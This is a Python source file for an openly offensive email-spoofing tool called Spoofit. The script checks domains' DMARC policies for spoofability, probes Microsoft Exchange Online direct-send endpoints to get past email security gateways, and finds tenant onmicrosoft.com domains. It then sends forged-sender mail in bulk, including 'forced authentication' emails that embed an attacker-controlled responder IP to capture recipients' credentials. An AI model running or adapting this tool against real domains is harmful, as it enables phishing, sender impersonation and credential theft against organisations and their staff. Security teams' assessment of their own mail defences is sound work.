#!/usr/bin/env python3
import smtplib
import dns.resolver
import argparse
import os
import configparser
import csv
import tldextract
import urllib.request
import urllib.error
import json
import re
import string
import random
import datetime

def print_banner():
    banner = r"""
   _____                   _____ __
  / ___/____  ____  ____  / __(_) /_
  \__ \/ __ \/ __ \/ __ \/ /_/ / __/
 ___/ / /_/ / /_/ / /_/ / __/ / /_
/____/ .___/\____/\____/_/ /_/\__/
    /_/
   """
    print(banner)

def get_domain_from_email(email):
    return email.split('@')[1]

def get_mx_record(domain):
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        mx_record = min(answers, key=lambda r: r.preference).exchange.to_text().strip()

        ipv4_addresses = []
        for rdata in dns.resolver.resolve(mx_record, 'A'):
            ipv4_addresses.append(rdata.to_text())

        if ipv4_addresses:
            return ipv4_addresses[0]
        else:
            print(f"[!] No IPv4 address found for {mx_record}.")
            return None
    except Exception as e:
        print(f"[!] Error retrieving MX record for {domain}: {e}")
        return None

def get_eop_hostname(domain):
    """
    Derives the Exchange Online Protection (EOP) direct-send hostname.
    Format: domain-com.mail.protection.outlook.com
    This endpoint exists independently of whatever the org sets as primary MX.
    """
    return domain.replace('.', '-') + '.mail.protection.outlook.com'

def detect_o365(domain):
    """
    Returns True if the domain uses Exchange Online (O365/M365).
    Checks MX records and SPF TXT records for Microsoft indicators.
    The primary MX may be a third-party gateway (Proofpoint, Mimecast) even
    when O365 is the underlying mail platform -- SPF is the more reliable signal.
    """
    try:
        for rdata in dns.resolver.resolve(domain, 'MX'):
            if 'mail.protection.outlook.com' in rdata.exchange.to_text().lower():
                return True
    except Exception:
        pass

    try:
        for rdata in dns.resolver.resolve(domain, 'TXT'):
            if 'spf.protection.outlook.com' in str(rdata).lower():
                return True
    except Exception:
        pass

    return False

def get_primary_mx_hostname(domain):
    """Returns the lowest-preference MX hostname for a domain, or empty string on failure."""
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        return min(answers, key=lambda r: r.preference).exchange.to_text().lower().rstrip('.')
    except Exception:
        return ""

def get_onmicrosoft_domain(domain):
    """
    Attempts to discover the tenant's .onmicrosoft.com domain.
    Strategy 1: DNS resolution of a name-based guess (works when tenant name
                 matches the primary domain label, which is common).
    Strategy 2: Microsoft OpenID Connect discovery endpoint (falls back gracefully).
    Returns the .onmicrosoft.com hostname if found, None otherwise.
    """
    extracted = tldextract.extract(domain)
    guessed = f"{extracted.domain}.onmicrosoft.com"
    try:
        dns.resolver.resolve(guessed, 'MX')
        return guessed
    except Exception:
        pass

    try:
        url = f"https://login.microsoftonline.com/{domain}/.well-known/openid-configuration"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode())
            for val in data.values():
                if isinstance(val, str):
                    m = re.search(r'([\w-]+\.onmicrosoft\.com)', val)
                    if m:
                        return m.group(1)
    except Exception:
        pass

    return None

def check_eop_direct_send(domain):
    """
    Probes domain-com.mail.protection.outlook.com to check whether direct send
    is accepted from the internet, which would bypass any email gateway (Proofpoint,
    Mimecast, Barracuda, etc.) configured as the primary MX.

    The probe sends EHLO + MAIL FROM + RCPT TO but does NOT issue DATA -- it is
    sufficient to determine acceptance without delivering a message.
    """
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

    eop_host = get_eop_hostname(domain)
    result = {
        "eop_host": eop_host,
        "resolves": False,
        "direct_send_open": False,
        "notes": ""
    }

    print(f"\n[*] Checking EOP direct-send endpoint: {eop_host}")

    eop_ip = None
    try:
        eop_ip = dns.resolver.resolve(eop_host, 'A')[0].to_text()
        result["resolves"] = True
    except Exception:
        try:
            mx_host = min(
                dns.resolver.resolve(eop_host, 'MX'), key=lambda r: r.preference
            ).exchange.to_text().rstrip('.')
            eop_ip = dns.resolver.resolve(mx_host, 'A')[0].to_text()
            result["resolves"] = True
        except Exception:
            print(f"{YELLOW}[!] {eop_host} does not resolve. Domain may not use Exchange Online.{RESET}")
            return result

    print(f"[+] {eop_host} resolved to {eop_ip}")

    try:
        with smtplib.SMTP(timeout=10) as server:
            server.connect(eop_ip, 25)
            server.ehlo_or_helo_if_needed()
            code, msg = server.mail(f"spoofit-probe@{domain}")
            if code == 250:
                code2, msg2 = server.rcpt(f"probe@{domain}")
                server.rset()
                server.quit()
                msg2_str = msg2.decode() if isinstance(msg2, bytes) else str(msg2)
                if code2 == 250:
                    result["direct_send_open"] = True
                    result["notes"] = "MAIL FROM + RCPT TO accepted"
                    print(f"{GREEN}[+] DIRECT SEND OPEN: {eop_host} accepts spoofed mail for {domain}.{RESET}")
                    print(f"{GREEN}    Email gateway (Proofpoint/Mimecast/etc.) can be bypassed via this endpoint.{RESET}")
                else:
                    result["notes"] = f"RCPT TO rejected: {msg2_str}"
                    print(f"{YELLOW}[!] MAIL FROM accepted but RCPT TO rejected: {msg2_str}{RESET}")
            else:
                msg_str = msg.decode() if isinstance(msg, bytes) else str(msg)
                result["notes"] = f"MAIL FROM rejected: {msg_str}"
                print(f"{YELLOW}[!] SMTP probe MAIL FROM rejected: {msg_str}{RESET}")
    except smtplib.SMTPConnectError as e:
        result["notes"] = f"Connection refused: {e}"
        print(f"{YELLOW}[!] Cannot connect to {eop_host}:25 (outbound port 25 may be blocked or EOP is filtering): {e}{RESET}")
    except Exception as e:
        result["notes"] = f"Probe error: {e}"
        print(f"[!] EOP probe error: {e}")

    return result

def send_email(mx_record, sender, recipient, subject, body):
    """
    Attempts direct-to-MX delivery with proper RFC 5322 headers.
    Adding Date, Message-ID, and MIME-Version reduces spam scoring
    since missing or malformed headers are a common spam signal.
    """
    try:
        date_str = datetime.datetime.now(datetime.timezone.utc).strftime(
            '%a, %d %b %Y %H:%M:%S +0000'
        )
        msg_id_local = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        sender_domain = sender.split('@')[1]

        message = (
            f"Date: {date_str}\r\n"
            f"Message-ID: <{msg_id_local}@{sender_domain}>\r\n"
            f"To: {recipient}\r\n"
            f"From: {sender}\r\n"
            f"Subject: {subject}\r\n"
            f"MIME-Version: 1.0\r\n"
            f"Content-Type: text/html; charset=UTF-8\r\n"
            f"\r\n"
            f"{body}"
        )

        with smtplib.SMTP(mx_record, 25) as server:
            server.ehlo_or_helo_if_needed()
            server.mail(sender)
            code, msg = server.rcpt(recipient)
            if code != 250:
                print(f"[!] Failed to send email to {recipient}: {msg}")
                return
            server.data(message)
            print(f"[+] Email sent to {recipient}")
    except smtplib.SMTPRecipientsRefused:
        print(f"[!] Recipient refused: {recipient}")
    except smtplib.SMTPException as e:
        print(f"[!] Error sending email to {recipient}: {e}")

def load_config(forced=False):
    """
    Loads configuration from 'conf/spoofit.conf'.
    If forced=True, loads forced authentication subject/body.
    Otherwise loads standard spoof email subject/body.
    """
    config = configparser.ConfigParser()
    config_file = 'conf/spoofit.conf'
    if not os.path.exists(config_file):
        print(f"[!] Configuration file {config_file} does not exist.")
        return None

    config.read(config_file)
    if forced:
        subject = config.get('ForcedAuthEmail', 'subject')
        body_file = config.get('ForcedAuthEmail', 'body_file')
        with open(body_file, 'r') as file:
            body = file.read()
    else:
        subject = config.get('Email', 'subject')
        body = config.get('Email', 'body')
    return subject, body

def create_forced_auth_email(body_template, responder_ip):
    return body_template % {'responder': responder_ip}

def is_subdomain(domain):
    extracted = tldextract.extract(domain)
    org_domain = f"{extracted.domain}.{extracted.suffix}"
    return domain.lower() != org_domain.lower()

def has_mx_record(domain):
    try:
        dns.resolver.resolve(domain, 'MX')
        return True
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers):
        return False
    except Exception:
        return False

def check_spoofability(domain):
    """
    Checks if 'domain' can be spoofed based on DMARC:
    - First checks if domain has MX records (no MX = not spoofable)
    - If p=reject => not spoofable
    - If p=quarantine => partial (Doubtful)
    - If p=none or no DMARC => likely spoofable
    - Subdomain logic: if org domain has sp=reject/quarantine => enforced
      else subdomain is unprotected
    """
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

    result = {
        "domain": domain,
        "policy": "",
        "spoofable": False,
        "o365": False,
        "eop_host": "",
        "eop_direct_send": None,
        "eop_notes": "",
        "onmicrosoft_domain": ""
    }

    try:
        if not has_mx_record(domain):
            print(f"{RED}[-] {domain} has no MX records (cannot receive email).{RESET}")
            result["policy"] = "No MX record"
            return result

        try:
            dmarc_answer = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
            dmarc_record = str(dmarc_answer[0]).lower()
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            dmarc_record = None

        if dmarc_record:
            if "p=reject" in dmarc_record:
                print(f"{RED}[-] Spoofing not possible for {domain}: DMARC p=reject (fully enforced).{RESET}")
                result["policy"] = "p=reject (fully enforced)"
            elif "p=quarantine" in dmarc_record:
                print(f"{YELLOW}[!] DMARC p=quarantine for {domain} (partial).{RESET}")
                result["policy"] = "p=quarantine (partial)"
                result["spoofable"] = True
            elif "p=none" in dmarc_record:
                print(f"{YELLOW}[!] DMARC p=none for {domain} (not enforced).{RESET}")
                result["policy"] = "p=none (not enforced)"
                result["spoofable"] = True
            else:
                print(f"{YELLOW}[!] DMARC record found for {domain} but unknown p= tag.{RESET}")
                result["policy"] = "No recognized p= (treat as none)"
                result["spoofable"] = True
        else:
            extracted = tldextract.extract(domain)
            org_domain = f"{extracted.domain}.{extracted.suffix}"
            if org_domain.lower() == domain.lower():
                print(f"{YELLOW}[!] No DMARC for {domain}.{RESET}")
                result["policy"] = "No record"
                result["spoofable"] = True
            else:
                try:
                    org_dmarc = dns.resolver.resolve(f"_dmarc.{org_domain}", "TXT")
                    org_record = str(org_dmarc[0]).lower()
                except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                    org_record = None

                if org_record:
                    sp_tag = ""
                    for token in org_record.split():
                        if token.startswith("sp="):
                            sp_tag = token.split("=", 1)[1]
                            break

                    if sp_tag == "reject":
                        print(f"{RED}[-] {domain} has no DMARC, but {org_domain} has sp=reject => subdomain protected.{RESET}")
                        result["policy"] = "sp=reject (org domain)"
                    elif sp_tag == "quarantine":
                        print(f"{YELLOW}[!] {domain} no DMARC, {org_domain} sp=quarantine => partial subdomain.{RESET}")
                        result["policy"] = "sp=quarantine (org domain)"
                        result["spoofable"] = True
                    else:
                        if "p=reject" in org_record:
                            print(f"{YELLOW}[!] {domain} no DMARC; {org_domain} p=reject but no sp= => subdomain not enforced.{RESET}")
                            result["policy"] = "No sp= (org p=reject)"
                            result["spoofable"] = True
                        elif "p=quarantine" in org_record:
                            print(f"{YELLOW}[!] {domain} no DMARC; {org_domain} p=quarantine but no sp= => sub partial.{RESET}")
                            result["policy"] = "No sp= (sub partial)"
                            result["spoofable"] = True
                        else:
                            print(f"{YELLOW}[!] No DMARC for {domain}, no sp= => subdomain unprotected.{RESET}")
                            result["policy"] = "No sp= (sub unprotected)"
                            result["spoofable"] = True
                else:
                    print(f"{YELLOW}[!] No DMARC for {domain} and no DMARC for {org_domain}.{RESET}")
                    result["policy"] = "No record (org none)"
                    result["spoofable"] = True

        if result["spoofable"]:
            if "quarantine" in result["policy"].lower():
                print(f"{YELLOW}[+] Spoofing might slip through if spam is recovered.{RESET}")
            else:
                if is_subdomain(domain):
                    print(f"{YELLOW}[!] Spoofing might be possible for subdomain: {domain}{RESET}")
                else:
                    print(f"{GREEN}[+] Spoofing possible for {domain}.{RESET}")

    except Exception as e:
        print(f"[!] Error checking spoofability for {domain}: {e}")
        result["policy"] = "Error"

    return result

def print_summary_table(dmarc_results):
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"

    if not dmarc_results:
        print("[!] No domains to display in summary table.")
        return

    print("\nFinal Summary:")
    print("-" * 120)
    print(f"{'Domain':<35} | {'DMARC Policy':<30} | {'Spoofable':<9} | {'O365':<4} | {'EOP Direct Send':<16} | Notes")
    print("-" * 120)

    for res in dmarc_results:
        domain = res["domain"]
        policy = res["policy"]

        if res["spoofable"]:
            if "quarantine" in policy.lower():
                spoof_str = "Doubtful"
            else:
                if is_subdomain(domain):
                    spoof_str = f"{YELLOW}Maybe{RESET}"
                else:
                    spoof_str = f"{GREEN}Yes{RESET}"
        else:
            spoof_str = "No"

        o365_str = "Yes" if res.get("o365") else "-"

        eop_direct = res.get("eop_direct_send")
        if eop_direct is True:
            eop_str = f"{GREEN}OPEN{RESET}"
        elif eop_direct is False:
            eop_str = "Closed"
        else:
            eop_str = "-"

        notes = ""
        if res.get("onmicrosoft_domain"):
            notes = f"onmicrosoft: {res['onmicrosoft_domain']}"

        print(f"{domain:<35} | {policy:<30} | {spoof_str:<9} | {o365_str:<4} | {eop_str:<16} | {notes}")
    print("-" * 120 + "\n")

def export_results_csv(dmarc_results, filename):
    if not dmarc_results:
        print(f"[!] No results to export to {filename}.")
        return
    try:
        with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow([
                "Domain", "DMARC Policy", "Spoofing Possible",
                "O365 Detected", "EOP Host", "EOP Direct Send", "EOP Notes",
                "OnMicrosoft Domain"
            ])
            for r in dmarc_results:
                domain = r["domain"]
                policy = r["policy"]

                if r["spoofable"]:
                    if "quarantine" in policy.lower():
                        spoof = "Doubtful"
                    else:
                        spoof = "Maybe" if is_subdomain(domain) else "Yes"
                else:
                    spoof = "No"

                o365 = "Yes" if r.get("o365") else "No"
                eop_host = r.get("eop_host", "")
                eop_direct = r.get("eop_direct_send")
                if eop_direct is True:
                    eop_send = "Open"
                elif eop_direct is False:
                    eop_send = "Closed"
                else:
                    eop_send = "N/A"
                eop_notes = r.get("eop_notes", "")
                onmicrosoft = r.get("onmicrosoft_domain", "")

                writer.writerow([domain, policy, spoof, o365, eop_host, eop_send, eop_notes, onmicrosoft])
        print(f"[+] Exported results to {filename}")
    except Exception as e:
        print(f"[!] Error exporting to {filename}: {e}")

def load_domains_from_file(filepath):
    """Load domains from a text file, one domain per line."""
    domains = []
    try:
        with open(filepath, 'r') as f:
            for line in f:
                domain = line.strip()
                if domain and not domain.startswith('#'):
                    domains.append(domain)
        return domains
    except Exception as e:
        print(f"[!] Error reading domains from {filepath}: {e}")
        return []

def main():
    print_banner()
    parser = argparse.ArgumentParser(
        description="DMARC-Focused Email Spoofing Tool.",
        epilog="""
Examples:

  1) Check single domain:
     Spoofit.py -t domain.com

  2) Check multiple domains from file:
     Spoofit.py -t domains.txt -o results.csv

  3) Send a spoofed email (single recipient):
     Spoofit.py -s sender@domain.com -r recipient@domain.com

  4) Send a spoofed email (multiple recipients from file):
     Spoofit.py -s sender@domain.com -r recipients.txt

  5) Forced authentication:
     Spoofit.py -s sender@domain.com -r recipient@domain.com -f responder-ip
        """,
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument('-t', '--target', help='Target domain or file containing list of domains to check.')
    parser.add_argument('-o', '--output', help='Output CSV filename (optional, auto-generated if not specified).')
    parser.add_argument('-s', '--sender', help='Spoofed sender email.')
    parser.add_argument('-r', '--recipients', help='Recipient email or file containing list of recipient emails.')
    parser.add_argument('-f', '--forced', metavar='RESPONDER_IP',
                        help='Forced authentication with responder-ip.')

    args = parser.parse_args()
    if not any(vars(args).values()):
        parser.print_help()
        return

    YELLOW = "\033[93m"
    RESET = "\033[0m"

    # --- Domain check mode ---
    if args.target:
        dmarc_results = []
        domains_to_check = []

        if os.path.isfile(args.target):
            domains_to_check = load_domains_from_file(args.target)
            if not domains_to_check:
                print("[!] No valid domains found in file.")
                return
            print(f"[+] Loaded {len(domains_to_check)} domain(s) from {args.target}")
        else:
            domains_to_check = [args.target]

        print(f"\n[*] Running DMARC checks on {len(domains_to_check)} domain(s):\n")

        for dom in domains_to_check:
            res = check_spoofability(dom)

            if detect_o365(dom):
                res["o365"] = True
                print(f"\n[*] Microsoft Exchange Online (O365/M365) detected for {dom}")

                primary_mx = get_primary_mx_hostname(dom)
                if primary_mx and 'mail.protection.outlook.com' not in primary_mx:
                    print(f"[*] Primary MX is {primary_mx} (third-party gateway).")
                    print(f"[*] Checking whether EOP endpoint bypasses the gateway...")

                eop_result = check_eop_direct_send(dom)
                res["eop_host"] = eop_result["eop_host"]
                res["eop_direct_send"] = eop_result["direct_send_open"]
                res["eop_notes"] = eop_result["notes"]

                print(f"\n[*] Attempting to discover .onmicrosoft.com domain for {dom}...")
                onmicrosoft = get_onmicrosoft_domain(dom)
                if onmicrosoft:
                    res["onmicrosoft_domain"] = onmicrosoft
                    print(f"[+] Found onmicrosoft.com domain: {onmicrosoft}")
                    om_res = check_spoofability(onmicrosoft)
                    om_res["o365"] = False
                    om_res["eop_host"] = ""
                    om_res["eop_direct_send"] = None
                    om_res["eop_notes"] = ""
                    om_res["onmicrosoft_domain"] = ""
                    dmarc_results.append(om_res)
                else:
                    print(f"{YELLOW}[!] Could not auto-discover .onmicrosoft.com domain for {dom}.{RESET}")
                    print(f"    Enumerate manually: https://aadinternals.com or https://osint.aadinternals.com")

            dmarc_results.append(res)

        print_summary_table(dmarc_results)

        if args.output:
            csv_filename = args.output
        else:
            if os.path.isfile(args.target):
                base = os.path.splitext(os.path.basename(args.target))[0]
                csv_filename = f"{base}_spoofit_results.csv"
            else:
                csv_filename = args.target.replace('.', '_') + "_spoofit_results.csv"

        export_results_csv(dmarc_results, csv_filename)
        return

    # --- Send mode ---
    if args.recipients and args.sender:
        recipients = []
        if os.path.isfile(args.recipients):
            with open(args.recipients, 'r') as f:
                recipients = [line.strip() for line in f if line.strip()]
        else:
            recipients.append(args.recipients)

        if args.forced:
            cfg = load_config(forced=True)
            if not cfg:
                return
            subject, body_template = cfg
            body = create_forced_auth_email(body_template, args.forced)
            print(f"[*] Sending forced authentication email to {len(recipients)} recipients.")
        else:
            cfg = load_config()
            if not cfg:
                return
            subject, body = cfg
            print(f"[*] Sending spoofed email to {len(recipients)} recipients.")

        domain = get_domain_from_email(args.sender)
        mx_record = get_mx_record(domain)
        if not mx_record:
            print("[!] Failed to retrieve MX record. Exiting...")
            return

        for rcp in recipients:
            send_email(mx_record, args.sender, rcp, subject, body)
        return

    parser.print_help()

if __name__ == "__main__":
    main()
